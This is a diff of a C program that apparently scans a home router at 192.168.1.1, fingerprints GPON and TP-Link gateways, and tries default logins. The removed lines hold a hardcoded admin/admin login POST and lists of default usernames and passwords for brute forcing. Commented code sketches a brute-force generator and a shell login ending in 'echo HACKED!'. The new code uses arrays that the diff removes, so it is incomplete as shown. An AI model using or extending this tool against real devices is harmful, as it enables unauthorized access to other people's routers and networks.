@@ -9,67 +9,34 @@
 #include <errno.h>
 #include <arpa/inet.h>
 
+#include "consts.h"
+
+int setSock(int *sockfd) {
+    return (*sockfd = socket(AF_INET, SOCK_STREAM, 0));
+}
+
+int setConn(int *sockfd, struct sockaddr_in *serv_addr) {
+    return connect(*sockfd, (struct sockaddr *)serv_addr, sizeof(*serv_addr));
+}
+
 int main(int argc, char* argv[]) {
-	int sockfd = 0,
-		n = 0,
-		connPort = 80;
-	struct sockaddr_in
-		serv_addr;
-	char buff[1024],
-		connAddr[] = "192.168.1.1";
+    int sockfd = 0, n = 0, connPort = 80, headerCnt = 0, vendorCnt = 0;
+    struct sockaddr_in serv_addr;
+    char buff[4096], connAddr[] = "192.168.1.1";
 
-	// HTTP Headers
-	char** headers[] = {
-		"GET /",
-		"POST /GponForm/LoginForm",
-		"XWebPageName=index&username=admin&password=admin"
-		};
-	int headerCnt = 0;
+    memset(buff, '\0', sizeof(buff));
 
-	// Recognize by
-	char** recognizeList[] = {
-		"GPON Home Gateway",
-		"url=/login.html",
-		"TPLINK"
-		};
+    if (setSock(&sockfd) < 0) {
+        return 1;
+    }
 
-	// Vendor List
-	char** vendorList[] = {
-		"UNKNOWN",
-		"CALLIX / Ericsson GPON",
-		"TP-LINK 2010-2015"
-		};
-	int vendorCnt = 0;
-	
-	// Credentials
-	char** users[] = {
-		"admin",
-		"root",
-		"Admin"
-		};
-	char** passwords[] = {
-		"admin",
-		"password",
-		"1234",
-		"root",
-		"Admin",
-		"12345"
-		};
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(connPort);
+    serv_addr.sin_addr.s_addr = inet_addr(connAddr);
 
-	do {
-
-	memset(buff, '\0', sizeof(buff));
-
-	if (setSock(&sockfd) < 0)
-		return 1;
-
-	// set connection
-	serv_addr.sin_family = AF_INET;
-	serv_addr.sin_port = htons(connPort);
-	serv_addr.sin_addr.s_addr = inet_addr(connAddr);
-
-	if (setConn(&sockfd, &serv_addr) < 0)
-		return 1;
+    if (setConn(&sockfd, &serv_addr) < 0) {
+        return 1;
+    }
 
 	// BRUTE FORCE GENERATOR
 	//char lox[] = "";
@@ -83,34 +50,30 @@ int main(int argc, char* argv[]) {
 	//		memset(lox, '\0', sizeof(lox));
 	//	}
 	//}
-	
-	write(sockfd, headers[headerCnt], sizeof(headers[headerCnt]));
-	write(sockfd, "\n\n", 2);
-	// web part
-	while((n = read(sockfd, buff, sizeof(buff) - 1)) > 0) {
-		buff[n] = 0;
 
-		// Recognize the router
-		for (int i = 0; i <= (sizeof(recognizeList)/8)-1; ++i) {
-			
-			// First match
-			if (strstr(buff,recognizeList[i])) {
+    write(sockfd, headers[headerCnt], sizeof(headers[headerCnt]));
+    write(sockfd, "\n\n", 2);
 
-				if (recognizeList[i] == recognizeList[1]) {
-					headerCnt = 1;
-					vendorCnt = 1;
-					break;
-				}
+    while((n = read(sockfd, buff, sizeof(buff) - 1)) > 0) {
+        buff[n] = 0;
 
-				if (recognizeList[i] == recognizeList[2]) {
-					headerCnt = 2;
-					vendorCnt = 2;
-					break;
-				}
+        for (int i = 0; i < sizeof(recognizeList) / sizeof(recognizeList[0]); i++) {
+            if (strstr(buff, recognizeList[i])) {
+                break;
+            }
 
-			}
+			//if (recognizeList[i] == recognizeList[1]) {
+				//	headerCnt = 1;
+				//	vendorCnt = 1;
+				//	break;
+				//}
 
-		}
+				//if (recognizeList[i] == recognizeList[2]) {
+				//	headerCnt = 2;
+				//	vendorCnt = 2;
+				//	break;
+				//}
+        }
 
 		//if (strstr(buff,"d") != NULL) {
 		//	write(sockfd, "root\n", 5);
@@ -125,22 +88,11 @@ int main(int argc, char* argv[]) {
 		//	write(sockfd, "echo HACKED!\n", 13);
 		//}
 
-		// display on screen
-		fputs(buff, stdout);
-		printf("\n");
-	}
+        fputs(buff, stdout);
+        printf("\n");
+    }
 
-	printf(vendorList[vendorCnt]);
+    printf(vendorList[vendorCnt]);
 
-	} while (vendorCnt == 1);
-
-	return 0;
-}
-
-int setSock(int *sockfd) {
-	return (*sockfd = socket(AF_INET, SOCK_STREAM, 0));
-}
-
-int setConn(int *sockfd, struct sockaddr_in *serv_addr) {
-	return connect(*sockfd, (struct sockaddr*) &*serv_addr, sizeof(*serv_addr));
+    return 0;
 }
